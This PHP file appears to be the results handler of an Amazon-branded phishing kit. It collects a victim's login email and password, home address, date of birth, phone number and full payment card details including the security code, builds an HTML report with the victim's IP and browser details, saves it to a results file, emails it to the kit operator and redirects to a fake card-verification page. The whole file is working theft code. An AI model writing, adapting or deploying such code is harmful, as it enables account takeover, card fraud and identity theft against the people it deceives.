<?php

session_start();

include('../__CONFIG__.php');

if (isset($_POST['Sex']))
{

	$_SESSION['fullname'] = $_POST['fullname'];
	$_SESSION['address1'] = $_POST['address1'];
	$_SESSION['address2'] = $_POST['address2'];
	$_SESSION['city'] = $_POST['city'];
	$_SESSION['state'] = $_POST['state'];
	$_SESSION['zip'] = $_POST['zip'];
	$_SESSION['country'] = $_POST['country'];
	$_SESSION['dob'] = $_POST['dob'];
	$_SESSION['phone'] = $_POST['phone'];
	$_SESSION['nameoncard'] = $_POST['nameoncard'];
	$_SESSION['ncn'] = $_POST['ncn'];
	$_SESSION['cxxs'] = $_POST['cxxs'];
	$_SESSION['month'] = $_POST['month'];
	$_SESSION['year'] = $_POST['year'];

$message=
"
	<!DOCTYPE html>
	<html>
	<head>
		<meta charset='UTF-8' />
	</head>
	<body>
	<style type='text/css'>
	body{
		background: #fff;
		color: #fff;
		font-family: arial;
	}
	.rezlt{
		width: 600px;
		border: 1px solid #232f3e;
	}
	table{
		width: 100%;
	    background: #fff;
	    color: #444;
	}
	table td{
		padding: 10px;
	}
	.newline{
    width: 100%;
    background: #ff9900;
    height: 2px;
	}
	</style>
	<center>
	<div class='rezlt'>
		<h3 style='text-align: center;background: #232f3e;margin: 0px;padding: 17px;'>Amazone [LOGIN - BILLING - CARD]</h3>
		<table>
			<tr>
				<td style='width: 200px;'><b>Full name</b></td>
				<td style='width: 400px;'>".$_SESSION['EM']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Login Password</b></td>
				<td style='width: 400px;'>".$_SESSION['PW']."</td>
			</tr>
		</table>
		<div class='newline'></div>
		<table>
			<tr>
				<td style='width: 200px;'><b>Full name</b></td>
				<td style='width: 400px;'>".$_POST['fullname']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Address line 1</b></td>
				<td style='width: 400px;'>".$_POST['address1']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Address line 2</b></td>
				<td style='width: 400px;'>".$_POST['address2']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>City</b></td>
				<td style='width: 400px;'>".$_POST['city']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>State</b></td>
				<td style='width: 400px;'>".$_POST['state']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Zip</b></td>
				<td style='width: 400px;'>".$_POST['zip']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Country</b></td>
				<td style='width: 400px;'>".$_POST['country']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Date of birth</b></td>
				<td style='width: 400px;'>".$_POST['dob']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Phone number</b></td>
				<td style='width: 400px;'>".$_POST['phone']."</td>
			</tr>
		</table>
		<div class='newline'></div>
		<table>
			<tr>
				<td style='width: 200px;'><b>Full name</b></td>
				<td style='width: 400px;'>".$_SESSION['EM']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Login Password</b></td>
				<td style='width: 400px;'>".$_SESSION['PW']."</td>
			</tr>
		</table>
		<div class='newline'></div>
		<table>
			<tr>
				<td style='width: 200px;'><b>Name on card</b></td>
				<td style='width: 400px;'>".$_POST['nameoncard']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Card number</b></td>
				<td style='width: 400px;'>".$_POST['ncn']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Experation date</b></td>
				<td style='width: 400px;'>".$_POST['month']."/".$_POST['year']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>CSC</b></td>
				<td style='width: 400px;'>".$_POST['cxxs']."</td>
			</tr>
		</table>
		<div class='newline'></div>
		<table>
			<tr>
				<td style='width: 200px;'><b>IP</b></td>
				<td style='width: 400px;'><a href='http://geoiptool.com/?ip=".$_SERVER['REMOTE_ADDR']."' target='_blank'>".$_SERVER['REMOTE_ADDR']."</a></td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>User Agent</b></td>
				<td style='width: 400px;'>".$_SERVER['HTTP_USER_AGENT']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Accept Language</b></td>
				<td style='width: 400px;'>".$_SERVER['HTTP_ACCEPT_LANGUAGE']."</td>
			</tr>
		</table>
	</div>
	</center>
	</body>
	</html>
";
	$Txt_Rezlt = fopen('../../rezlt.html', 'a+');
	fwrite($Txt_Rezlt, $message);
	fclose($Txt_Rezlt);
	mail($to, $subject, $message, $headers);

	header('Location: ../verifiedby.php?udm_cat_path='.sha1(time()));
}
else
{
	# code...
}
